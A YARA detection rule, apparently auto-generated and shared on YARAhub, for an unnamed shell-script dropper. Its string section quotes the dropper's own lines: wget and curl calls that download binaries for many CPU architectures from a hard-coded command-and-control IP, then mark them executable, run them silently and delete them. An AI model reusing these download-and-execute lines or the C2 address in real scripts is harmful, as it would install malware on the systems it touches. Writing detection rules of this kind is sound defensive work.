rule SCRIPT_Dropper_Unknown_ForgeAuto_0fb67c95
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "0fb67c955cb54892936ecb8868a5b34bcb650eb38fa994d63bc5d9d42368a1a0"
        yarahub_uuid = "fffea360-3c10-4069-879e-d307fc33d586"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "7bd22d3505f09193c17c20acde8dc351"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "if command -v wget >/dev/null; then" ascii
        $s1 = "elif command -v curl >/dev/null; then" ascii
        $s2 = "ARCHS=\"mips mipsel x86 x86_64 armv7l armv4l armv5l i686 ppc64 aarch64\"" ascii
        $s3 = "CNC_IP=\"45.205.1.136\"" ascii
        $s4 = "local b=$(head /dev/urandom | tr -dc a-z0-9 | head -c 6)" ascii
        $s5 = "for p in /tmp /var/run /dev/shm /mnt /root /; do" ascii
        $s6 = "cd $p 2>/dev/null || continue" ascii
        $s7 = "wget -q http://$CNC_IP/$a -O $b" ascii
        $s8 = "curl -s http://$CNC_IP/$a -o $b" ascii
        $s9 = "[ -f \"$b\" ] && chmod +x \"$b\" && \"./$b\" >/dev/null 2>&1 && rm -f \"$b\" && break" ascii
        $s10 = "mips mipsel x86 x86_64 armv7l armv4l armv5l i686 ppc64 aarch64" ascii
        $s11 = ">/dev/null 2>&1 && rm -f" ascii
        $s12 = "for arch in $ARCHS; do x \"$arch\"; done" ascii
        $s13 = "45.205.1.136" ascii
        $s14 = "local a=$1" ascii
        $s15 = "] && chmod +x" ascii
    condition:
        true and filesize < 50MB and 2 of ($s0, $s1, $s2, $s4, $s5, $s6, $s7, $s8, $s9, $s10, $s11, $s12, $s14, $s15) and 1 of ($s3, $s13)
}
